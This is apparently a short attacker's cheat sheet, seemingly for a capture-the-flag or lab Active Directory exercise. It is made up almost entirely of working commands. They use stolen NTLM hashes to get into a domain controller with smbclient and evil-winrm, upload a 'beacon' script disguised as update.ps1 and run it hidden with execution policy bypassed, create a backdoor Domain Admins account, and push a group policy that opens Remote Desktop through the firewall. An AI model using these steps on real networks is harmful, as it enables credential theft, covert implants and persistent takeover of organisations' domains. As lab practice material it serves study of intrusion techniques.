With NTLM hashes obtained from running script, perform

smbclient //<ip_address_of_domain_controller>/<found share> -U "<domain>/<found privileged user>" --pw-nt-hash <hash after :>
    Can add -c "recurse; ls" | grep -i 'FLAG' to find possible flag files on that share

sudo apt update
sudo apt install ruby ruby-dev build-essential libreadline-dev
sudo gem install evil-winrm

evil-winrm -i <domain controller ip> -u <Privileged user> -H <hash> -s ~/pathto/scripts/

evil-winrm -i <domain controller ip> -u <Privileged user> -H <hash> << 'EOF' 
upload beacon.ps1 
move beacon.ps1 C:\Windows\Temp\update.ps1
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\update.ps1 
exit

Inside of Evil-winrm
Get-ADUser -Filter *
Get-ADOrganizationalUnit -Filter *

$password = "banana!"
New-ADUser -Name "AD Admin" -SamAccountName "adadmin" -UserPrincipalName "adadmin@lab.local" -Path "OU=Admins,DC=Lab,DC=local" -AccountPassword $password -Enabled $true 
Add-ADGroupMember -Identity "Domain Admins" -Members "adadmin"

$gpo = New-GPO -Name "Enable Remote Desktop"
Set-GPRegistryValue -Name "Enable Remote Desktop" `
    -Key "HKLM\System\CurrentControlSet\Control\Terminal Server" `
    -ValueName "fDenyTSConnections" `
    -Type DWord `
    -Value 0
Set-GPRegistryValue -Name "Enable Remote Desktop" `
    -Key "HKLM\Software\Policies\Microsoft\WindowsFirewall\DomainProfile\FirewallRules" `
    -ValueName "RemoteDesktop-In-TCP" `
    -Type String `
    -Value "v2.30|Action=Allow|Active=TRUE|Dir=In|Protocol=6|LPort=3389|App=%SystemRoot%\system32\svchost.exe|Svc=TermService|Name=Remote Desktop"
New-GPLink -Name "Enable Remote Desktop" -Target "DC=yourdomain,DC=com"
Invoke-GPUpdate -Computer "Server01" -RandomDelayInMinutes 0
